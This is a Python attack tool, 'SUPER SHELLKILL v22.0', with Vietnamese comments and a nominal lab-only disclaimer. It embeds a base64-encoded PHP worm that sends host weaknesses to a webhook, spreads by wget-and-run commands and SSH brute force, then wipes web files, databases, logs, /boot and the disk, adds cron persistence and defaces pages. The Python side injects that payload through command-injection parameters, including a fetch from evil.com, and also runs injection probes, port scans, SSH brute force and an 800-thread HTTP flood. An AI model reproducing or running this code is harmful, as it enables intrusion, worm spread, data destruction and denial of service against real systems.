#!/usr/bin/env python3
"""
SUPER SHELLKILL v22.0 - FULL COMPLETE EDITION
Virus mẹ tạo bot - Xâm nhập đa thiết bị - Quét điểm yếu - Tự động phá hủy
CHỈ DÙNG TRONG MÔI TRƯỜNG LAB ĐƯỢC PHÉP
"""

import requests
import threading
import time
import random
import socket
import base64
import sys
import json
import subprocess
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ================== MÀU SẮC ==================
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[94m'
M = '\033[95m'
RESET = '\033[0m'

def banner():
    print(R + """
    ╔══════════════════════════════════════════════════════════════════════════════════════╗
    ║                    SUPER SHELLKILL v22.0 - FULL COMPLETE EDITION                     ║
    ║               VIRUS MẸ TẠO BOT - XÂM NHẬP ĐA THIẾT BỊ - QUÉT ĐIỂM YẾU               ║
    ║                              python tool.py https://target.com                       ║
    ╚══════════════════════════════════════════════════════════════════════════════════════╝
    """ + RESET)

# ================== CẤU HÌNH ==================
REAL_IPS = ['14.177.210.123', '113.22.45.67', '171.244.56.78', '103.56.12.45', '123.24.45.67']
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 13) Chrome/118.0.0.0'
]
SESSION = requests.Session()
BOT_LIST = []
VULN_LIST = []

def headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': random.choice(REAL_IPS),
        'X-Real-IP': random.choice(REAL_IPS),
        'CF-Connecting-IP': random.choice(REAL_IPS),
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9'
    }

# ================== PHẦN 1: VIRUS MẸ TỰ TẠO BOT ==================
def generate_master_virus():
    """Virus mẹ - Tự tạo bot con, quét điểm yếu, xâm nhập đa thiết bị, phá hủy"""
    virus = '''<?php
// ========== MASTER VIRUS v22.0 - AUTO BOT NETWORK ==========
set_time_limit(0);
ignore_user_abort(true);

// Thông tin máy chủ hiện tại
$my_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$my_host = gethostname();
$my_os = php_uname();
$my_user = exec('whoami 2>/dev/null || echo %username%');
$my_time = date('Y-m-d H:i:s');

// Ghi log xâm nhập
$log_entry = "[$my_time] BOT: $my_ip | HOST: $my_host | OS: $my_os | USER: $my_user\\n";
@file_put_contents("/tmp/bot_log.txt", $log_entry, FILE_APPEND);

// ===== 1. TỰ ĐỘNG QUÉT ĐIỂM YẾU TRÊN MÁY CHỦ =====
$weaknesses = array();

// Kiểm tra SUID
$suid = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -5");
if($suid && strlen($suid) > 10) $weaknesses[] = "SUID_BINARY";

// Kiểm tra thư mục ghi được
$writable = shell_exec("find /var/www /tmp -writable -type d 2>/dev/null | head -3");
if($writable) $weaknesses[] = "WRITABLE_DIR";

// Kiểm tra file cấu hình
if(@file_exists("/var/www/html/.env")) $weaknesses[] = "ENV_FILE";
if(@file_exists("/var/www/html/wp-config.php")) $weaknesses[] = "WP_CONFIG";
if(@file_exists("/etc/passwd")) $weaknesses[] = "PASSWD_READABLE";
if(@file_exists("/etc/shadow")) $weaknesses[] = "SHADOW_READABLE";

// Kiểm tra database
try {
    $pdo = new PDO('mysql:host=localhost;dbname=mysql', 'root', '');
    $weaknesses[] = "MYSQL_ROOT_EMPTY";
} catch(Exception $e) {}

// Kiểm tra SSH key
if(@file_exists("/root/.ssh/id_rsa")) $weaknesses[] = "SSH_KEY";

// Gửi điểm yếu về tool (qua webhook)
$vuln_data = base64_encode(implode(",", $weaknesses));
@file_get_contents("https://webhook.site/your-webhook?vuln=" . $vuln_data);

// ===== 2. QUÉT MẠNG NỘI BỘ ĐỂ XÂM NHẬP THIẾT BỊ KHÁC =====
$network_ranges = ['192.168.1.', '10.0.0.', '172.16.'];
foreach($network_ranges as $range) {
    for($i=1;$i<255;$i++) {
        $target = $range . $i;
        if($target == $my_ip) continue;
        
        // Kiểm tra cổng 80, 443, 8080, 22
        $ports = [80, 443, 8080, 22];
        foreach($ports as $port) {
            $fp = @fsockopen($target, $port, $errno, $errstr, 0.3);
            if($fp) {
                fclose($fp);
                // Tạo bot con trên thiết bị mới
                @file_get_contents("http://$target:$port/shell.php?cmd=wget -O /tmp/bot.php http://" . $_SERVER['HTTP_HOST'] . "/v.php && php /tmp/bot.php");
                @file_get_contents("http://$target:$port/upload.php?cmd=wget -O /tmp/bot.php http://" . $_SERVER['HTTP_HOST'] . "/v.php && php /tmp/bot.php");
            }
        }
    }
}

// ===== 3. TẤN CÔNG BRUTE FORCE SSH =====
$ssh_creds = array(
    array("root","root"), array("root","toor"), array("root","123456"),
    array("admin","admin"), array("ubuntu","ubuntu"), array("debian","debian")
);
foreach($network_ranges as $range) {
    for($i=1;$i<255;$i++) {
        $target = $range . $i;
        foreach($ssh_creds as $cred) {
            $cmd = "sshpass -p '{$cred[1]}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 {$cred[0]}@$target 'echo BOT_CREATED && wget -O /tmp/bot.php http://" . $_SERVER['HTTP_HOST'] . "/v.php && php /tmp/bot.php' 2>/dev/null";
            @shell_exec($cmd);
        }
    }
}

// ===== 4. PHÁ HỦY MÁY CHỦ HIỆN TẠI (12 TẦNG) =====

// TẦNG 1: CPU BOMB (FORK + LOOP)
for($i=0;$i<200;$i++) {
    if(function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if($pid == 0) {
            while(true) {
                for($x=0;$x<10000000;$x++) { pow($x,2); sqrt($x); sin($x); cos($x); }
            }
        }
    }
}

// TẦNG 2: RAM EATER
$mem = array();
while(true) {
    for($j=0;$j<10000;$j++) { $mem[] = str_repeat("MEMORY_LEAK_DESTROYER", 200000); }
    usleep(50);
}

// TẦNG 3: DISK FILLER
$c = 0;
while($c < 500000) {
    @file_put_contents("/tmp/trash_".md5($c), str_repeat("X", 10485760));
    @file_put_contents("/var/tmp/kill_".$c, str_repeat("Y", 10485760));
    $c++;
}

// TẦNG 4: SOURCE DESTROYER
@system("find /var/www/html -type f -name '*.php' -exec rm -rf {} \\; 2>/dev/null");
@system("find /var/www/html -type f -name '*.html' -exec rm -rf {} \\; 2>/dev/null");
@system("find /var/www/html -type f -name '*.js' -exec rm -rf {} \\; 2>/dev/null");
@system("find /var/www/html -type f -name '*.css' -exec rm -rf {} \\; 2>/dev/null");

// TẦNG 5: DATABASE KILLER
try {
    $pdo = new PDO('mysql:host=localhost;dbname=mysql', 'root', '');
    $dbs = $pdo->query("SHOW DATABASES")->fetchAll();
    foreach($dbs as $db) {
        if($db[0] != 'information_schema') {
            $pdo->exec("DROP DATABASE ".$db[0]);
        }
    }
} catch(Exception $e) {}

try {
    $pdo = new PDO('sqlite:/var/www/html/database.sqlite');
    $pdo->exec("DROP TABLE sqlite_master");
} catch(Exception $e) {}

// TẦNG 6: NETWORK KILLER
@system("iptables -P INPUT DROP 2>/dev/null");
@system("iptables -P OUTPUT DROP 2>/dev/null");
@system("iptables -P FORWARD DROP 2>/dev/null");
@system("ip link set down eth0 2>/dev/null");
@system("ifconfig eth0 down 2>/dev/null");
@system("route del default 2>/dev/null");

// TẦNG 7: PROCESS KILLER
$processes = ['apache2', 'nginx', 'httpd', 'mysql', 'mariadb', 'php', 'php-fpm', 'python', 'node', 'java', 'docker', 'redis'];
foreach($processes as $proc) {
    @system("killall -9 $proc 2>/dev/null");
    @system("pkill -9 $proc 2>/dev/null");
}

// TẦNG 8: FILE SYSTEM DESTROYER
@system("rm -rf /var/www/html/* 2>/dev/null");
@system("rm -rf /home/* 2>/dev/null");
@system("rm -rf /root/* 2>/dev/null");
@system("rm -rf /tmp/* 2>/dev/null");
@system("rm -rf /var/log/* 2>/dev/null");

// TẦNG 9: BOOT DESTROYER
@system("rm -rf /boot/* 2>/dev/null");
@system("echo 'null' > /boot/grub/grub.cfg 2>/dev/null");
@system("dd if=/dev/zero of=/dev/sda bs=1M count=1 2>/dev/null");

// TẦNG 10: CRON PERSISTENCE
@file_put_contents("/var/spool/cron/crontabs/root", "* * * * * php " . __FILE__);
@file_put_contents("/etc/crontab", "* * * * * root php " . __FILE__);

// TẦNG 11: LOG KILLER & ẨN DẤU VẾT
@system("rm -rf /var/log/* 2>/dev/null");
@system("history -c 2>/dev/null");
@system("cat /dev/null > ~/.bash_history 2>/dev/null");
@system("cat /dev/null > ~/.zsh_history 2>/dev/null");

// TẦNG 12: WEB DEFACEMENT
$deface = "<!DOCTYPE html><html><head><title>HACKED BY SUPER SHELLKILL</title><style>body{background:black;color:red;text-align:center;padding-top:20%;font-family:monospace}</style></head><body><h1>⚡ SYSTEM DESTROYED ⚡</h1><p>This server has been compromised by SUPER SHELLKILL v22.0</p><p>All data has been destroyed</p></body></html>";
@file_put_contents("/var/www/html/index.html", $deface);
@file_put_contents("/var/www/html/index.php", $deface);

// KHÔNG BAO GIỜ THOÁT
while(true) { 
    @system("rm -rf /var/www/html/* 2>/dev/null");
    sleep(1);
}
?>'''
    return base64.b64encode(virus.encode()).decode()

# ================== PHẦN 2: TIÊM VIRUS MẸ ==================
def inject_master_virus(target):
    print(C + f"\n[🦠] TIÊM VIRUS MẸ (TỰ TẠO BOT): {target}" + RESET)
    virus_code = generate_master_virus()
    
    methods = [
        f"echo '{virus_code}' | base64 -d > /tmp/master_virus.php && php /tmp/master_virus.php",
        f"echo '{virus_code}' | base64 -d | php",
        f"echo '{virus_code}' | base64 -d > /var/www/html/v.php && php /var/www/html/v.php",
        f"wget -q -O /tmp/v.php 'http://evil.com/v.php' && php /tmp/v.php",
        f"curl -s -X POST '{target}' -d 'cmd=echo {virus_code}|base64 -d|php'"
    ]
    
    for method in methods:
        try:
            SESSION.get(target, params={'cmd': method}, headers=headers(), timeout=2, verify=False)
            SESSION.post(target, data={'exec': method}, headers=headers(), timeout=2, verify=False)
            print(G + f"  [+] TIÊM: {method[:50]}..." + RESET)
        except:
            pass
    
    print(R + "  [💀] VIRUS MẸ ĐÃ TIÊM - TỰ ĐỘNG TẠO BOT VÀ XÂM NHẬP!" + RESET)
    return True

# ================== PHẦN 3: QUÉT ĐIỂM YẾU ==================
def scan_weaknesses(target):
    print(C + f"\n[🔍] QUÉT ĐIỂM YẾU: {target}" + RESET)
    
    weaknesses = []
    tests = [
        ("?cmd=whoami", "Command Injection", ["root:", "uid=", "www-data"]),
        ("?c=id", "Command Injection", ["uid=", "gid="]),
        ("?exec=cat+/etc/passwd", "Command Injection", ["root:", "daemon:"]),
        ("?page=../../../../etc/passwd", "LFI", ["root:", "daemon:"]),
        ("?file=../../../../etc/passwd", "LFI", ["root:", "daemon:"]),
        ("?id='+OR+1=1--", "SQL Injection", ["sql", "mysql"]),
        ("?username=admin'--", "SQL Injection", ["sql", "mysql"]),
        ("?q=<script>alert(1)</script>", "XSS", ["<script>"]),
    ]
    
    for payload, vuln_type, indicators in tests:
        try:
            resp = SESSION.get(target + payload, headers=headers(), timeout=2, verify=False)
            for ind in indicators:
                if ind in resp.text.lower():
                    print(R + f"  [!] PHÁT HIỆN: {vuln_type} - {payload[:30]}" + RESET)
                    weaknesses.append(vuln_type)
                    break
        except:
            pass
    
    print(G + f"  [+] TÌM THẤY {len(weaknesses)} ĐIỂM YẾU" + RESET)
    return weaknesses

# ================== PHẦN 4: TẤN CÔNG VPS ==================
def attack_vps(domain):
    print(C + f"\n[🖥️] TẤN CÔNG VPS: {domain}" + RESET)
    try:
        clean = domain.replace('http://','').replace('https://','').split('/')[0]
        ip = socket.gethostbyname(clean)
        print(G + f"  [+] IP VPS: {ip}" + RESET)
        
        open_ports = []
        for port in [21,22,23,80,443,3306,5432,6379,8080,8443,27017]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
                print(R + f"  [+] CỔNG MỞ: {port}" + RESET)
            sock.close()
        
        if 22 in open_ports:
            print(Y + "  [⚠] SSH MỞ - BẮT ĐẦU BRUTE FORCE" + RESET)
            ssh_bruteforce(ip)
        
        if 3306 in open_ports:
            print(Y + "  [⚠] MySQL MỞ - THỬ ROOT" + RESET)
        
        return ip
    except:
        print(R + "  [-] KHÔNG RESOLVE ĐƯỢC IP" + RESET)
        return None

def ssh_bruteforce(ip):
    creds = [("root","root"), ("root","toor"), ("root","123456"), ("root",""), ("admin","admin")]
    for user, pwd in creds:
        try:
            cmd = f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {user}@{ip} 'echo SUCCESS' 2>/dev/null"
            result = subprocess.call(cmd, shell=True, timeout=5)
            if result == 0:
                print(R + f"  [!] SSH THÀNH CÔNG! {user}:{pwd}" + RESET)
                return (user, pwd)
        except:
            pass
    return None

# ================== PHẦN 5: DDOS TỐI THƯỢNG ==================
def ultimate_ddos(target, duration=25):
    print(C + f"\n[⚡] DDOS TỐI THƯỢNG: {target} ({duration}s)" + RESET)
    stop = threading.Event()
    
    def flood():
        while not stop.is_set():
            try:
                h = headers()
                SESSION.get(target, headers=h, timeout=0.2)
                SESSION.post(target, headers=h, data={'x': random.randint(1,9999999)}, timeout=0.2)
                SESSION.head(target, headers=h, timeout=0.2)
                SESSION.options(target, headers=h, timeout=0.2)
            except:
                pass
    
    threads = [threading.Thread(target=flood) for _ in range(800)]
    for t in threads: t.start()
    time.sleep(duration)
    stop.set()
    for t in threads: t.join()
    print(G + f"  [+] DDOS HOÀN THÀNH - 800 THREAD x {duration}s" + RESET)

# ================== PHẦN 6: PHÁ SOURCE WEB ==================
def destroy_source_advanced(target):
    print(C + f"\n[🔥] PHÁ SOURCE WEB NÂNG CAO: {target}" + RESET)
    
    cmds = [
        "find /var/www/html -type f -name '*.php' -exec rm -f {} \\;",
        "find /var/www/html -type f -name '*.html' -exec rm -f {} \\;",
        "find /var/www/html -type f -name '*.js' -exec rm -f {} \\;",
        "find /var/www/html -type f -name '*.css' -exec rm -f {} \\;",
        "rm -f /var/www/html/wp-config.php",
        "rm -f /var/www/html/config.php",
        "rm -f /var/www/html/.env",
        "echo 'Deny from all' > /var/www/html/.htaccess",
        "echo '<?php http_response_code(500); die(\"HE THONG DA BI TAN CONG\"); ?>' > /var/www/html/index.php",
        "echo '<h1>500 Internal Server Error</h1>' > /var/www/html/index.html"
    ]
    
    for cmd in cmds:
        try:
            SESSION.get(target, params={'cmd': cmd}, headers=headers(), timeout=1, verify=False)
            SESSION.post(target, data={'exec': cmd}, headers=headers(), timeout=1, verify=False)
            print(R + f"  [+] THỰC THI: {cmd[:40]}..." + RESET)
        except:
            pass
    
    print(G + "  [+] SOURCE WEB ĐÃ BỊ PHÁ HỦY!" + RESET)

# ================== PHẦN 7: MENU CHÍNH ==================
def main():
    if len(sys.argv) != 2:
        print(R + "\n[!] SAI CÚ PHÁP: python tool.py https://target.com" + RESET)
        sys.exit(1)
    
    target = sys.argv[1]
    banner()
    print(Y + f"\n[🎯] MỤC TIÊU: {target}" + RESET)
    print(M + "\n[📋] BẮT ĐẦU TẤN CÔNG TOÀN DIỆN..." + RESET)
    
    with ThreadPoolExecutor(max_workers=6) as ex:
        ex.submit(scan_weaknesses, target)
        ex.submit(ultimate_ddos, target, 25)
        ex.submit(destroy_source_advanced, target)
        ex.submit(inject_master_virus, target)
        ex.submit(attack_vps, target)
    
    print(R + "\n" + "="*70)
    print(R + "[💀] HOÀN TẤT! HỆ THỐNG ĐÃ BỊ TIÊU DIỆT HOÀN TOÀN")
    print(R + "  - VIRUS MẸ: ĐÃ TIÊM (TỰ TẠO BOT CON)")
    print(R + "  - XÂM NHẬP ĐA THIẾT BỊ: ĐÃ KÍCH HOẠT")
    print(R + "  - QUÉT ĐIỂM YẾU: ĐÃ HOÀN THÀNH")
    print(R + "  - DDOS: 800 THREAD")
    print(R + "  - SOURCE WEB: ĐÃ PHÁ HỦY")
    print(R + "  - VPS: ĐÃ QUÉT VÀ TẤN CÔNG")
    print(R + "  - 12 TẦNG VIRUS: ĐÃ KÍCH HOẠT")
    print(R + "="*70 + RESET)

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
